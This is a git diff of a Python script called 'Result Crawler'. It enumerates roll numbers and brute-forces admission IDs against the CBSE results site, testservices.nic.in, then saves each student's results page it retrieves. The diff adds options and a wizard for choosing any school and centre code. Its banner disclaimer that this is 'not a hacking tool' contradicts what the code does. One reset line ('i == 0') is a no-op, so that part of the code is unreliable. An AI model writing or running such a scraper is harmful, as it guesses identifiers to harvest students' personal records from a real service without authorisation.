@@ -1,9 +1,55 @@
 import requests
 import re
 import glob
+from optparse import OptionParser
+import os
+if not os.path.exists("Results"):
+    os.makedirs("Results")
+
+class color:
+    PURPLE = "\033[95m"
+    CYAN = "\033[96m"
+    DARKCYAN = "\033[36m"
+    BLUE = "\033[94m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    RED = "\033[91m"
+    BOLD = "\033[1m"
+    UNDERLINE = "\033[4m"
+    END = "\033[0m"
+    WHITE = "\33[37m"
+
 
 session = requests.Session()
+artwork = (
+    color.BOLD
+    + color.PURPLE
+    + """
+______                _ _     _____                    _           
+| ___ \\              | | |   /  __ \\                  | |          
+| |_/ /___  ___ _   _| | |_  | /  \\/_ __ __ ___      _| | ___ _ __ 
+|    // _ \\/ __| | | | | __| | |   | '__/ _` \\ \\ /\\ / / |/ _ \\ '__|
+| |\\ \\  __/\\__ \\ |_| | | |_  | \\__/\\ | | (_| |\\ V  V /| |  __/ |   
+\\_| \\_\\___||___/\\__,_|_|\\__|  \\____/_|  \\__,_| \\_/\\_/ |_|\\___|_|  
+{0} Disclaimer - Made by students for fun, not to hurt anyone's privacy.
+{0} This is not a hacking tool.
+{0} You might have to wait for results, the program tells you when it finds one.
+""".format(
+        color.BLUE
+    )
+)
+print(artwork)
+parser = OptionParser()
 
+parser.add_option("-s", "--start", dest="start", help="the starting roll no.")
+parser.add_option("-e", "--end", dest="end", help="the ending roll no.")
+parser.add_option("-c", "--code", dest="sklcode", help="School Code")
+parser.add_option("-n", "--center", dest="centNo", help="Center code")
+(c_options, args) = parser.parse_args()
+start = c_options.start
+end = c_options.end
+sklcode = c_options.sklcode
+centNo = c_options.centNo
 headers = {
     "Host": "testservices.nic.in",
     "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
@@ -24,19 +70,61 @@ pv4 = "218520f49f375ef87e6d64848742f8d82195e9f7"
 fn = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
 i = 0
+
+
+def wizard():
+    global start, end, sklcode, centNo
+    try:
+        request = requests.get(
+            "https://testservices.nic.in/cbseresults/class_xii_a_2024/ClassTwelfth_c_2024.asp"
+        )
+        if request.status_code == 200:
+            print(f"{color.GREEN}[OK] {color.WHITE}")
+    except requests.ConnectTimeout:
+        print(
+            color.RED
+            + "[X]"
+            + color.YELLOW
+            + "\n[!] "
+            + color.WHITE
+            + "Connection timed out"
+        )
+        exit(1)
+    except KeyboardInterrupt:
+        print(color.RED + "[!] " + color.WHITE + "Exited upon user request...")
+        exit()
+    except:
+        print(color.RED + "[X]" + color.WHITE)
+        print(
+            color.RED
+            + "[!]"
+            + color.WHITE
+            + " Website could not be located make sure to use http / https"
+        )
+        exit()
+
+    start = input(color.GREEN + "[~] " + color.WHITE + "Start value: ")
+    end = input(color.GREEN + "[~] " + color.WHITE + "Stop value: ")
+    sklcode = input(
+        color.GREEN + "[~] " + color.WHITE + "School code: "
+    )
+    centNo = input(
+        color.GREEN + "[~] " + color.WHITE + "Center code: "
+    )
+
+
 def req(rno):
-    # print(rno)
-    global pv1, pv2, pv3, pv4, fn,i
-    
-    if i >25:
-        i==0
+    global pv1, pv2, pv3, pv4, fn, i
+
+    if i > 25:
+        i == 0
     fc = 0
 
     for mn in aph:
         payload = {
             "regno": rno,
-            "sch": "60182",
-            "admid": f"{fn[i]}{mn}{str(rno)[5:7]}6010",
+            "sch": sklcode,
+            "admid": f"{fn[i]}{mn}{str(rno)[5:7]}{sklcode[0:2]}{centNo[2:4]}",
             "B2": "Submit",
             "as_sfid": pv1,
             "as_fid": pv2,
@@ -54,19 +142,27 @@ def req(rno):
             f = open(f"Results/{rno}.htm", "w")
             f.write(q.text)
             f.close()
-            print(f"Found: [{rno}]")
+            print(f"{color.GREEN}Found: {color.WHITE}[{rno}]")
         else:
             fc += 1
-        print("FN",fn[i],i)
-        if i >25:
-            i==0
+        if i > 25:
+            i == 0
         if fc == 26:
             i += 1
             req(rno)
-            
 
 
-for rno in range(21634900, 21635326):  # 4926-5326
+if c_options.start == None:
+    if c_options.end == None:
+        if c_options.sklcode == None:
+            if c_options.centNo == None:
+                try:
+                    wizard()
+                except KeyboardInterrupt:
+                    print(f"{color.RED}\n[#] {color.WHITE}Exited upon user request...")
+                    exit()
+
+for rno in range(int(start), int(end)):
     if f"Results/{rno}.htm" in [f for f in glob.glob("Results/*.htm")]:
         print(f"{rno} already in list")
         continue
